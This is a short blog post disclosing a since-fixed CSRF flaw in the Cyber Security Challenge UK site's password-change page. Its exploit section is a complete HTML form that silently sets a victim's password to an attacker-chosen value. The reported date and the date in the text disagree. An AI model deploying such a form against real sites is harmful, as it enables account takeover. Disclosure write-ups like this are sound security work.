---
layout: post
title: Cyber Security Challenge Change Password CSRF
tag: 
---

# About

Cross Site Request Forgery Vulnerability in
<https://cybersecuritychallenge.org.uk/>

* Reported: 10/08/13
* Fixed: 12/08/13

The Cyber Security challenge is a UK based organisation organising security based challenges for enthusiasts. The bug was a Cross Site Request Forgery vulnerability and was found in the user profile page on the Cyber Security Challenge website. This allowed attackers to change the password of the target user and login to their account. The bug was reported on the 10th of July 2013 and the bug was swiftly fixed a couple of days after.

# Exploit

```html
<!doctype html>
<html>
<body>
<form name="form0"
action="https://cybersecuritychallenge.org.uk/registration/index.php/player/change_password/change"
method="post">
<input type="hidden" name="user_newpass" value="1234567" />
<input type="hidden" name="user_newpass2" value="1234567" />
<input type="submit" value="Perform CSRF" />
</form>
</body>
</html>
```